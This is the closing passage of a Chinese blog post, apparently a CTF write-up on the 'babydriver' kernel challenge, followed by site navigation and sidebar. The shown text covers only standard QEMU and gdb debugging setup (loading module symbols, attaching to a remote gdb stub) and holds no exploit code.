+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # lsmod</span><br><span class="line">babydriver 16384 2 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="导入符号表"><a href="#导入符号表" class="headerlink" title="导入符号表"></a>导入符号表</h3><p>最后面填写babydriver的基址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file .&#x2F;fs&#x2F;lib&#x2F;modules&#x2F;4.4.72&#x2F;babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="调试qumu"><a href="#调试qumu" class="headerlink" title="调试qumu"></a>调试qumu</h3><p>在boot.sh中添加参数如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp::9999</span><br></pre></td></tr></table></figure>
+
+<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>运行程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;boot.sh</span><br></pre></td></tr></table></figure>
+
+<p>在gdb中连接该qemu程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote 127.0.0.1:9999</span><br></pre></td></tr></table></figure>
+
+<p>运行如图</p>
+<p><img src="/images/wp-babydriver-1.png"></p>
+<p>先下个断点</p>
+<p><img src="/images/wp-babydriver-2.png"></p>
+<p>那么就和平时调试差不多了,只是调试相对比较慢而已, 下面就不演示了…</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.i0gan.cn/2020/09/15/wp-babydriver/" data-id="ckhemv81w002jwdcm2oqjgvod" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/09/16/wp-2020-qwb-easypwn/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          wp 2020强网杯 easypwn
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/09/14/kernel-pwn-knowledge-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">kernel pwn knowledge 1</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 i0gan<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
